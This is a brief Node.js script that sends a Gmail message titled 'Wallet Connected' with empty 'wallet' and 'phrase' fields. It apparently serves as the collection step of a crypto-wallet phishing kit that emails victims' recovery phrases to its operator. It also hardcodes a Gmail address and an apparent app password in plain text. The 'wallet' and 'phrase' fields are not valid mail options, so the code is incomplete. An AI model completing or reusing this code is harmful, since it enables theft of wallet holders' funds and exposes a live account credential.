const nodemailer = require('nodemailer');

// Create a transporter object using the default SMTP transport
let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'austinmary624@gmail.com', // Your email address
        pass: 'pmip oovo npbe hsld' // Your email password or app-specific password
    }
});

// Define email content
let mailOptions = {
    from: 'austinmary624@gmail.com',
    to: 'austinmary624@gmail.com',
    subject: 'Wallet Connected',
    wallet: '',
    phrase: ''
};

// Send email
transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
        return console.log(error);
    }
    console.log('Message sent: %s', info.messageId);
});

